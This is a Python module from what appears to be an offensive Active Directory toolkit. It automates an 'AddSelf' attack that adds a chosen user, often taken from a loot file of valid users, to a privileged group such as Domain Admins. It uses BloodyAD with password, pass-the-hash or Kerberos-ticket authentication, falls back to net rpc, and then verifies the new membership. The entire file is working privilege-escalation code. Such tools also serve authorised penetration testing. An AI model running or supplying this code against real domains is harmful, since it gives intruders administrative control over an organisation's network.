# modules/addself.py

import os
from core.colors import green, red, yellow, blue
from core.helpers import run_command, get_auth_args, select_from_list

def attack_addself(session, target_group=None, target_user=None):
    print(blue(f"[*] Attempting AddSelf using BloodyAD on {session.target_ip}..."))

    # === Prompt for group if not provided ===
    if not target_group:
        target_group = input("[?] Enter group name (e.g., Domain Admins): ").strip()

    # === Prompt for user if not provided ===
    if not target_user:
        loot_path = "loot/valid_users.txt"
        if os.path.exists(loot_path):
            with open(loot_path, "r") as f:
                users = [line.strip() for line in f if line.strip()]
            if users:
                target_user = select_from_list(users, "Select user to add to group")
            else:
                target_user = input("[?] Enter username to add: ").strip()
        else:
            target_user = input("[?] Enter username to add: ").strip()

    # === Check if user is already in group ===
    if _check_membership(session, target_group, target_user):
        print(green(f"[+] {target_user} is already a member of {target_group}. Skipping add."))
        return

    # === Build BloodyAD command ===
    if session.hash:
        auth = f"-u \"{session.username}\" -p :{session.hash}"
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} add groupMember \"{target_group}\" \"{target_user}\""
        )
    elif session.password:
        auth = f"-u \"{session.username}\" -p \"{session.password}\""
        bloody_cmd = (
            f"bloodyAD --host {session.target_ip} -d {session.domain} "
            f"{auth} add groupMember \"{target_group}\" \"{target_user}\""
        )
    else:
        if not session.dc_hostname:
            print(red("[-] Kerberos mode requires session.dc_hostname (FQDN of domain controller)."))
            return
        bloody_cmd = (
            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
            f"-d {session.domain} add groupMember \"{target_group}\" \"{target_user}\""
        )

    # === Run BloodyAD ===
    out, err = run_command(bloody_cmd)
    combined = out + "\n" + err

    if "entryAlreadyExists" in combined or "ENTRY_EXISTS" in combined:
        print(green(f"[+] BloodyAD confirms: {target_user} is already a member of {target_group}."))
        return

    elif any(word in combined.lower() for word in ["success", "added", "groupmember modified"]):
        print(green(f"[+] BloodyAD succeeded:\n{out or err}"))
        print(blue("[*] Verifying group membership..."))
        verified = _check_membership(session, target_group, target_user, verbose=False)
        if verified:
            print(green(f"[+] Confirmed: {target_user} is a member of {target_group}"))
        else:
            print(yellow(f"[!] BloodyAD reported success, but could not confirm membership for {target_user}."))
            print(yellow("[!] This may be due to replication delay, case mismatch, or RPC limitation."))
            print(yellow("[!] Use BloodHound or manual LDAP to verify."))
        return

    else:
        print(red(f"[!] BloodyAD failed: {err if err else out}"))
        if not session.hash and not session.password:
            print(yellow("[!] Skipping net rpc fallback (not supported with Kerberos ticket cache)."))
        else:
            print(yellow("[*] Trying fallback with net rpc..."))
            rpc_auth = get_auth_args(session)
            rpc_cmd = (
                f"net rpc group addmem \"{target_group}\" \"{target_user}\" "
                f"{rpc_auth} -S {session.dc_ip}"
            )
            out, err = run_command(rpc_cmd)
            combined = out + "\n" + err

            if any(word in combined.lower() for word in ["added", "success", "ok"]):
                print(green(f"[+] net rpc succeeded:\n{out or err}"))
            else:
                print(red(f"[-] net rpc failed: {err if err else out}"))

    print(blue("[*] Verifying group membership..."))
    _check_membership(session, target_group, target_user, verbose=True)


def _check_membership(session, group, user, verbose=False):
    if session.hash or session.password:
        rpc_auth = get_auth_args(session)
        check_cmd = f"net rpc group members \"{group}\" {rpc_auth} -S {session.dc_ip}"
    else:
        krb5cc = os.getenv("KRB5CCNAME", "/tmp/krb5cc_1000")
        check_cmd = (
            f"net rpc group members \"{group}\" -S {session.dc_ip} "
            f"--use-kerberos=required --use-krb5-ccache={krb5cc}"
        )

    out, err = run_command(check_cmd)
    members = out + "\n" + err

    found = user.lower() in members.lower()

    if verbose:
        if found:
            print(green(f"[+] Confirmed: {user} is a member of {group}"))
        else:
            print(red(f"[-] {user} not found in {group}."))
            print(yellow("[!] Manual verification or BloodHound may be needed."))

    return found
